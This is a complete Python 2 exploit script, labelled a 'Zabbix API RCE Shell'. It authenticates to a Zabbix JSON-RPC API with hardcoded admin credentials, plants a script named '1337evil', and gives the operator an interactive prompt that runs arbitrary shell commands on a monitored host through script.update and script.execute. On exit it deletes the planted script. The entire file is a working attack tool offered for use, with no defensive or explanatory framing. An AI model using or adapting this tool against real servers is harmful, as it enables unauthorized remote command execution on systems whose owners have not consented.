#!/usr/bin/env python
#
# Zabbix API RCE Shell
#
# TODO: Further research needed to discover if
#       other user accounts can create/modify scripts
#####################################################

import requests
import json
import readline
import signal

url  = 'http://192.168.1.1/zabbix'    # base url
url += '/api_jsonrpc.php'               # endpoint 

username = 'superadmin'     # username
password = 'password'       # password
hostid = '10101'            # must have write permissions to host
scriptname = '1337evil'     # w/e you wanna name it

headers = { 'content-type': 'application/json' }


def send_request(json_data):
    res = requests.post(url, data=json.dumps(json_data), headers=(headers))
    return res.json();

def build_request(method, params, session = None):
    req = {
        "jsonrpc" : "2.0",
        "method" : method,
        "params": params,
        "auth" : session,
        "id" : 0,
    }
    return req

def login(req):
    res = send_request(req)
    if res.has_key("result") and res["result"] != "":
        session = res["result"]
        print "[>] Successful login [" + session + "]"
        return session
    else:
        print "[!] unable to authenticate, exiting.."
        print res
        exit();

def logout(req):
    res = send_request(req)
    if (res.has_key("result") and res["result"] == True):
        print "[>] logged out of session"
    else:
        print "[!] unable to log out of session: "
        print res

def get_script(session):

    create_params = { 
        "name" : scriptname, 
        "command" : "echo hello", 
        "host_access" : 3   # 2 = read, 3 = writes
    }

    res = send_request(build_request("script.create", create_params, session))
    if res.has_key("result") and res["result"].has_key("scriptids"):
        return res["result"]["scriptids"][0]
    else:
        if "already exists." in res["error"]["data"]:
            
            print "[>] script already exists, looking up it's id.."
            
            res = send_request(build_request("script.get", 
                { "output":"extend", "search": { "name" : scriptname } }, session))
            
            if res.has_key("result"):
                return res["result"][0]["scriptid"]

        print "[!] could not lock a script" 
        print res

def delete(req):
    res = send_request(req)
    if res.has_key("result") and res["result"].has_key("scriptids"):
        if res["result"]["scriptids"][0] == scriptid:
            print "[>] script successfully deleted"
            return True

    print "[!] Unable to delete script:"
    print res

def execute(scriptid, cmd, session):
    upd = send_request(build_request("script.update", {"scriptid":scriptid,"command":cmd}, session))
    exe = send_request(build_request("script.execute", {"scriptid":scriptid,"hostid":hostid}, session))
    return exe

def quit(session, delete_script = ''):
    print ""
    if delete_script != '':
        delete(build_request("script.delete", [delete_script], session))

    logout(build_request("user.logout", [], session))
    exit()

## open up a session
session = login(build_request("user.login", {"user":username,"password":password}))

## create / lookup the script by name. return it's ID
scriptid = get_script(session)
print "[>] script id found [" + scriptid + "]"

## CMD prompt - update the script and execute the commands
while True:
    try:
        cmd = raw_input('\033[41m[zabbix~$]>>: \033[0m ')
        if cmd == "exit":
            break
        else:
            output = execute(scriptid, cmd, session)
            if output.has_key("result"):
                print output["result"]["value"]
            else:
                print output
    except KeyboardInterrupt:
        quit(session)

quit(session)